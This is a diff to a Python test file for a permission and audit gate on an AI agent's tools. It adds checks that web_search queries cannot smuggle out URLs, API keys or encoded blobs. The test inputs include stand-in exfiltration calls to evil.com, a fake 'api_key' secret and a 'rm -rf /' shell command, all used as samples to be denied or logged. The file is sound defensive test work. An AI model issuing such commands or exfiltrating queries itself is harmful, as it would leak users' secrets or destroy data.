@@ -76,6 +76,15 @@ check("read #3 over budget", denied(g.call("get_best_sources", {}), "limit"))
 g.new_turn()
 check("new turn resets budget", allowed(g.call("get_best_sources", {})))
 
+section("G8 — web_search query can't smuggle data")
+q = ToolGate(confirm=None)
+check("normal query", allowed(q.call("web_search", {"query": "EU AI Act enforcement November 2026"})))
+check("site: scoping still allowed", allowed(q.call("web_search", {"query": "site:reuters.com Ukraine ceasefire"})))
+q.new_turn()
+check("URL in query denied", denied(q.call("web_search", {"query": "see https://evil.com/x"}), "URLs"))
+check("secret in query denied", denied(q.call("web_search", {"query": "news api_key=abc123"}), "secrets"))
+check("long blob denied", denied(q.call("web_search", {"query": "c2VjcmV0LWRhdGEtZXhmaWx0cmF0ZWQtdmlhLXNlYXJjaA=="}), "longer than 40"))
+
 section("Ex 2 — web_fetch URL provenance")
 g = ToolGate(confirm=None)
 g.new_turn(user_text="please read https://www.reuters.com/world/abc. thanks")
@@ -168,8 +177,8 @@ if log_path.exists():
     log_path.unlink()
 g = ToolGate(confirm=lambda n, a, r: True, audit=AuditLog(log_path, host="test"))
 g.new_turn("hi")
-g.call("web_search", {"query": "my api_key=sk-abcdefghijklmnopqrstuvwxyz"})
-g.call("web_fetch", {"url": "https://news.example.com/story-1"})
+g.call("web_search", {"query": "my api_key=sk-abcdefghijklmnopqrstuvwxyz"})  # denied by G8, still logged
+g.call("web_fetch", {"url": "https://news.example.com/story-1"})   # unlisted (search was denied) → approved
 g.call("web_fetch", {"url": "https://evil.com/?d=x"})          # unlisted → approved by stub human
 g.call("rate_source", {"source_name": "x", "quality": 9, "reason": "r"})
 g.call("run_shell", "rm -rf /")
@@ -177,9 +186,9 @@ g.record_program_call("web_search", {"query": "forced"}, "results")
 events = [json.loads(l) for l in log_path.read_text().splitlines()]
 decisions = [e["decision"] for e in events]
 check("one line per call", len(events) == 6, str(decisions))
-check("decisions recorded", decisions == ["allowed", "allowed", "user_approved", "denied", "denied", "program"],
+check("decisions recorded", decisions == ["denied", "user_approved", "user_approved", "denied", "denied", "program"],
       str(decisions))
-check("secret in args redacted", "sk-abc" not in log_path.read_text() and "[REDACTED]" in events[0]["args"]["query"],
+check("secret in a denied call is still redacted in the log", "sk-abc" not in log_path.read_text() and "[REDACTED]" in events[0]["args"]["query"],
       events[0]["args"]["query"])
 check("approval reason logged", "not from this turn" in events[2].get("reason", ""))
 check("result hashed, not stored", "result_sha256" in events[1] and "fetched" not in json.dumps(events[1]))
@@ -191,7 +200,7 @@ check("log rotates past max_bytes", (tmp / "logs" / "rot.jsonl.1").exists())
 import subprocess, sys as _sys
 rep = subprocess.run([_sys.executable, str(Path(__file__).parent.parent / "audit_report.py"),
                       "--file", str(log_path)], capture_output=True, text=True)
-check("audit_report flags issues (exit 1)", rep.returncode == 1 and "Denied by policy (2)" in rep.stdout,
+check("audit_report flags issues (exit 1)", rep.returncode == 1 and "Denied by policy (3)" in rep.stdout,
       rep.stdout + rep.stderr)
 
 finish()
